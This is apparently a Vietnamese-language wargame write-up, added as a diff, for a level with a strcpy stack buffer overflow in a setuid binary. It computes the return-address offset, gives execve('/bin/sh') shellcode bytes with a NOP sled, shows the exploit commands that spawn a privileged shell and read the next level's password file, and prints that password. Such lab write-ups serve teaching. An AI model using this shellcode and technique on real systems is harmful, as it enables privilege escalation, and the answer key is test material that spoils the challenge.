@@ -1,0 +1,80 @@
+Level 5 - Tràn bộ đệm cổ điển (strcpy không kiểm tra bound), ghi đè return address bằng NOP sled + shellcode trong biến môi trường
+
+Source liên quan (level05.c):
+  int main(int argc, char **argv) {
+      char buf[128];
+      if(argc < 2) return 1;
+      strcpy(buf, argv[1]);       // KHÔNG kiểm tra độ dài argv[1]
+      printf("%s\n", buf);
+      return 0;
+  }
+
+Lỗ hổng:
+- strcpy(buf, argv[1]) copy chuỗi nguồn tới khi gặp byte '\0', hoàn toàn
+  không quan tâm buf chỉ có 128 byte. Nếu argv[1] dài hơn, phần dư tràn thẳng
+  lên các vùng nhớ liền kề phía trên buf trên stack - lần lượt là: padding
+  do compiler chèn để căn chỉnh bộ nhớ, saved EBP (4 byte, giá trị %ebp cũ
+  được "push %ebp" lưu lại), rồi tới SAVED EIP / RETURN ADDRESS (4 byte, do
+  lệnh "call" tự động đẩy vào stack trước khi nhảy vào main).
+- Khi main() kết thúc, lệnh "leave; ret" sẽ lấy đúng 4 byte tại vị trí
+  "saved EIP" và nạp vào %eip (con trỏ lệnh) - CPU nhảy tới BẤT KỲ địa chỉ
+  nào nằm ở đó, không kiểm tra hợp lệ. Ghi đè đúng 4 byte này bằng địa chỉ
+  do attacker chọn (trỏ vào shellcode tự cấy) = chiếm quyền điều khiển luồng
+  thực thi, với đặc quyền setuid của binary (owner level6).
+- Đây là kiểu tấn công "return address overwrite" chuẩn mực - khác với
+  level 3 (ghi đè 1 con trỏ hàm cục bộ) ở chỗ target là giá trị mà CHÍNH
+  cơ chế gọi hàm/return của CPU dùng, áp dụng được cho MỌI hàm có strcpy/
+  gets/sprintf... không giới hạn bound.
+
+Tính offset (từ disas main, KHÔNG đoán):
+  lea -0x88(%ebp),%eax   -> buf nằm tại ebp-0x88 (136 byte thấp hơn ebp),
+                             dùng làm đích cho cả strcpy và vị trí đọc lại
+                             trong printf (xác nhận đúng buf, không nhầm biến)
+  Cấu trúc stack chuẩn x86 sau "push %ebp; mov %esp,%ebp":
+    [ebp]     = saved EBP (4 byte)
+    [ebp+4]   = saved EIP / return address (4 byte)
+  Offset từ đầu buf tới return address = 0x88 (đến ebp) + 4 (saved EBP)
+                                        = 0x8C = 140 byte
+  => Payload dài đúng 140 + 4 = 144 byte mới ghi đè chính xác return address.
+
+Cách khai thác:
+  1. cat level05.c ; gdb ./level05 ; disas main   (xác định offset = 140,
+     như tính ở trên)
+
+  2. Nhúng shellcode + NOP sled vào 1 biến môi trường:
+     export SHELLCODE=$(python2 -c 'print "\x90"*100 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')
+     - 100 byte đầu (\x90 = NOP, "không làm gì, nhảy sang lệnh kế tiếp") tạo
+       "bãi đáp" rộng - chỉ cần EIP rơi vào BẤT KỲ đâu trong dải NOP là sẽ
+       "trượt" xuống đúng shellcode thật, không cần chính xác tuyệt đối.
+     - 33 byte cuối là shellcode gọi execve("/bin/sh", ...) trực tiếp bằng
+       syscall (int 0x80), không qua thư viện libc.
+
+  3. Tìm địa chỉ thật của biến SHELLCODE bằng tool getenvaddr.c (LƯU Ý: phải
+     làm việc trong thư mục có quyền ghi như /tmp, vì /levels không thể
+     ghi file mới với quyền level5 thông thường):
+     mkdir -p /tmp/toan_lv5 && cd /tmp/toan_lv5
+     [viết getenvaddr.c, dùng getenv() + điều chỉnh theo độ lệch độ dài
+      argv[0] giữa chương trình getenvaddr và chương trình đích, vì vị
+      trí biến môi trường trên stack phụ thuộc độ dài đường dẫn gọi]
+     gcc -m32 -o getenvaddr getenvaddr.c
+     ./getenvaddr SHELLCODE /levels/level05
+     -> SHELLCODE sẽ ở địa chỉ 0xbffffdb3
+
+  4. Ghép payload 144 byte (140 NOP + 4 byte địa chỉ little-endian) và chạy:
+     /levels/level05 $(python2 -c 'print "\x90"*140 + "\xb3\xfd\xff\xbf"')
+     -> in ra 1 dòng ký tự không đọc được ("????...") - ĐÂY LÀ BÌNH THƯỜNG:
+        đó là printf("%s\n", buf) VẪN CHẠY ĐÚNG TRƯỚC KHI hàm return, in ra
+        nguyên 140 byte NOP (không phải ký tự in được) + 4 byte địa chỉ vừa
+        ghi đè. Sau đó "leave; ret" mới đọc return address đã bị ghi đè và
+        nhảy vào shellcode.
+     -> shell mới xuất hiện (quyền level6)
+
+  5. Trong shell mới: id ; cat /home/level6/.pass
+
+Kỹ thuật liên quan: stack layout (saved EBP/EIP), strcpy không kiểm tra
+                    bound, ghi đè return address, NOP sled, shellcode gọi
+                    execve qua syscall trực tiếp, địa chỉ biến môi trường
+                    trên stack phụ thuộc độ dài argv[0], gdb disas để tính
+                    offset chính xác, quyền ghi thư mục theo euid
+
+Pass/Key: fQ8W8YlSBJBWKV2R
